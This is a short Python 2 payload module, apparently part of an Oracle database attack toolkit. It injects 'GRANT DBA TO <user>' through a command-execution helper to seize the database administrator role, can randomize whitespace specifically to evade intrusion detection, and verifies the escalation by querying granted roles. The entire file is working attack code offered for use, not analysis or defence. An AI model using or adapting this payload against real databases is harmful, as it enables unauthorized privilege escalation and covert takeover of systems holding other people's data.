#!/usr/bin/python

import sys

sys.path.append("../../lib")
sys.path.append("../lib")
sys.path.append("lib")

import run_command
from oracleids import randomizeSpaces

data = "GRANT DBA TO %USER%"

name = "become_dba"
brief_description = "Become dba"

class CPayload:

    user = "TEST"
    function = "F1"
    useDML = False
    covert = 0
    verifyCommand = "SELECT 1 FROM USER_ROLE_PRIVS WHERE GRANTED_ROLE = 'DBA'"
    type = 0
    connection = None
    method = 1

    def __init__(self):
        pass

    def run(self):
        global data

        tmp = data
        tmp = tmp.replace("%USER%", self.user)

        if self.covert > 0:
            # Currently only one IDS evasion technique is used
            tmp = randomizeSpaces(tmp)

        objRun = run_command.CPayload()
        objRun.idsTechniques = self.covert
        objRun.user = self.user
        objRun.command = tmp
        objRun.connection = self.connection
        objRun.method = self.method
        ret = objRun.run()

        self.function = objRun.function

        return ret

    def verify(self, connection):
        sql = self.verifyCommand
        cursor = connection.cursor()
        cursor.execute(sql)

        for x in cursor.fetchall():
            return True
        
        return False

def main():
    import cx_Oracle

    a = CPayload()
    a.idsTechniques = 1
    cmd = a.run()

    print cmd

if __name__ == "__main__":
    main()
 
